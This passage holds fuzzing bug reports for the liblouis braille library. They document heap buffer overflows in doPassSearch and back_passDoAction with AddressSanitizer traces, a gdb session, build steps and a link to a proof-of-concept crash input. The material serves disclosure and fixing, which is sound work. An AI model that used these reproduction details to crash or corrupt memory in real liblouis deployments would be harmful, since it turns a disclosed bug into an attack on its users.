    #1 0x5600c29e992e in _lou_allocMem /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5287:21
    #2 0x5600c2a2e493 in allocStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:62:9
    #3 0x5600c2a20f36 in getStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:85:35
    #4 0x5600c2a1e572 in _lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1266:9
    #5 0x5600c2a1cbe4 in lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1129:9
    #6 0x5600c2a1ca56 in lou_translateString /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1121:9
    #7 0x5600c29decd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/./fuzz_translate_generic.c:117:2
    #8 0x5600c28ebcd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x70cd4) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #9 0x5600c28d4e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x59e06) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #10 0x5600c28da8ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x5f8ba) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #11 0x5600c2905076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x8a076) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #12 0x7f7a3642a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #13 0x7f7a3642a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #14 0x5600c28cf9d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x549d4) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:654:10 in doPassSearch
Shadow bytes around the buggy address:
  0x51e000001f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000002000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000002080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000002100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51e000002180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x51e000002200: 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa
  0x51e000002280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000002300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000002380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000002400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51e000002480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==292378==ABORTING
```

# poc-API-2442891-back_passDoAction-HBO
Heap buffer overflow in `back_passDoAction()`

## Reference

## Summary
There is a heap buffer overflow problem in `back_passDoAction()` at liblouis/lou_backTranslateString.c:1565 when run `fuzz_backtranslate`

https://github.com/liblouis/liblouis/blob/24428912bc57697044b0e8be8acbc8eacf25830a/liblouis/lou_backTranslateString.c#L1563-L1566

In the `while` loop, `destStartMatch + count * sizeof(*output->chars)` exceeds the `output->maxlength`, causing the overflow.

```
(gdb) p count * sizeof(*output->chars)
$11 = 10
(gdb) p output->maxlength
$10 = 8688
(gdb) b lou_backTranslateString.c:1565 if destStartMatch == 8676
Note: breakpoints 3 and 4 also set at pc 0x5555556f7ddc.
Breakpoint 5 at 0x5555556f7ddc: file ../../code/liblouis/lou_backTranslateString.c, line 1565.
(gdb) c
Continuing.

Thread 1 "fuzz_backtransl" hit Breakpoint 5, back_passDoAction (table=0x530000000400, pos=0x7ffff5a09020, mode=64, input=0x7ffff5b09260, output=0x7ffff5b092a0, 
    posMapping=0x52d000000400, cursorPosition=0x7ffff5b092e0, cursorStatus=0x7ffff5b092f0, ctx=0x7ffff5a09030, currentOpcode=CTO_Pass2, currentRule=0x530000008218, 
    passInstructions=0x53000000824e, passIC=24, match=...) at ../../code/liblouis/lou_backTranslateString.c:1565
1565                                    memmove(&output->chars[destStartMatch], &output->chars[destStartReplace],
1: destStartMatch = 8676
(gdb) 
Continuing.

Thread 1 "fuzz_backtransl" hit Breakpoint 4, back_passDoAction (table=0x530000000400, pos=0x7ffff5a09020, mode=64, input=0x7ffff5b09260, output=0x7ffff5b092a0, 
    posMapping=0x52d000000400, cursorPosition=0x7ffff5b092e0, cursorStatus=0x7ffff5b092f0, ctx=0x7ffff5a09030, currentOpcode=CTO_Pass2, currentRule=0x530000008218, 
    passInstructions=0x53000000824e, passIC=24, match=...) at ../../code/liblouis/lou_backTranslateString.c:1565
1565                                    memmove(&output->chars[destStartMatch], &output->chars[destStartReplace],
1: destStartMatch = 8677
(gdb) 
Continuing.
=================================================================
==3545186==ERROR: AddressSanitizer: heap-buffer-overflow
```

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 2442891)

## How to trigger
1. Compile liblouis with AddressSanitizer
    ```bash
    $ ./autogen.sh
    $ mkdir build_asan
    $ CC="clang -fsanitize=address,fuzzer-no-link -g " ../configure --prefix=$(pwd)/../bin_asan
    $ make -j && make install
    ```
2. Compile the fuzz driver, the fuzz driver code is in `tests/fuzzing/fuzz_backtranslate.c`.
    The compile command is:
    ```bash
    $ clang ./fuzz_backtranslate.c -o ./fuzz_backtranslate -fsanitize=fuzzer,address,undefined -g -I ./build_asan/liblouis -I ../liblouis ./bin_asan/lib/liblouis.a -lyaml
    ```
3. Download the [poc file](https://github.com/Marsman1996/pocs/raw/refs/heads/master/liblouis/poc-API-2442891-back_passDoAction-HBO) and run the compiled driver: `$ ./fuzz_backtranslate ./poc-API-2442891-back_passDoAction-HBO`

## ASan Report
```
$ ./fuzz_backtranslate ./poc-API-2442891-back_passDoAction-HBO
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2677507738
INFO: Loaded 1 modules   (2924 inline 8-bit counters): 2924 [0x563bac609748, 0x563bac60a2b4), 
INFO: Loaded 1 PC tables (2924 PCs): 2924 [0x563bac60a2b8,0x563bac615978), 
./fuzz_backtranslate: Running 1 inputs 1 time(s) each.
Running: ./poc-API-2442891-back_passDoAction-HBO
=================================================================
==2386643==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5290000135e8 at pc 0x563bac50f1d7 bp 0x7ffe610dedb0 sp 0x7ffe610de570
READ of size 10 at 0x5290000135e8 thread T0
    #0 0x563bac50f1d6 in __asan_memmove (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x1181d6) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #1 0x563bac59ae8c in back_passDoAction /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:1565:5
    #2 0x563bac595fbb in translatePass /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:1630:9
    #3 0x563bac58f3bc in _lou_backTranslate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:267:9
    #4 0x563bac58dbe4 in lou_backTranslate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:153:9
    #5 0x563bac58da56 in lou_backTranslateString /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:145:9
    #6 0x563bac54fcd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/./fuzz_backtranslate.c:110:3
    #7 0x563bac45ccd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x65cd4) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #8 0x563bac445e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x4ee06) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #9 0x563bac44b8ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x548ba) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #10 0x563bac476076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x7f076) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #11 0x7f9d3142a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #12 0x7f9d3142a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #13 0x563bac4409d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x499d4) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)

0x5290000135e8 is located 0 bytes after 17384-byte region [0x52900000f200,0x5290000135e8)
allocated by thread T0 here:
    #0 0x563bac510e03 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x119e03) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #1 0x563bac55a92e in _lou_allocMem /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5287:21
    #2 0x563bac596983 in allocStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:56:9
    #3 0x563bac591526 in getStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:79:35
    #4 0x563bac58e7a8 in _lou_backTranslate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:214:8
    #5 0x563bac58dbe4 in lou_backTranslate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:153:9
    #6 0x563bac58da56 in lou_backTranslateString /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:145:9
    #7 0x563bac54fcd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/./fuzz_backtranslate.c:110:3
    #8 0x563bac45ccd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x65cd4) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #9 0x563bac445e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x4ee06) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #10 0x563bac44b8ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x548ba) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #11 0x563bac476076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x7f076) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)
    #12 0x7f9d3142a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #13 0x7f9d3142a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #14 0x563bac4409d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x499d4) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_backtranslate+0x1181d6) (BuildId: e185cb2e51f4decd648cacf00090d446166bbd81) in __asan_memmove
Shadow bytes around the buggy address:
  0x529000013300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x529000013380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x529000013400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x529000013480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x529000013500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x529000013580: 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa
  0x529000013600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x529000013680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x529000013700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x529000013780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x529000013800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2386643==ABORTING
```

#